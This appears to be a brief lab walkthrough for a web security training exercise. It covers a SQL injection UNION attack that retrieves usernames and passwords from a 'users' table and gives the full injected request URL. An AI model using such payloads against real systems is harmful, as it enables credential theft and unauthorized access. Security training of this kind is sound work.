# SQL injection UNION attack, retrieving data from other tables

The database contains a different table called `users`, with columns called `username` and `password`.

1. Find the number of columns using `UNION SELECT`
2. Send the following request to get usernames and passwords

```
https://0a07008d04f1fee2801f21bd00c300da.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--+-
```

![[attachments/sqli-lab-9/file-20260206135416513.png]]

3. Log in as the administrator to solve the lab

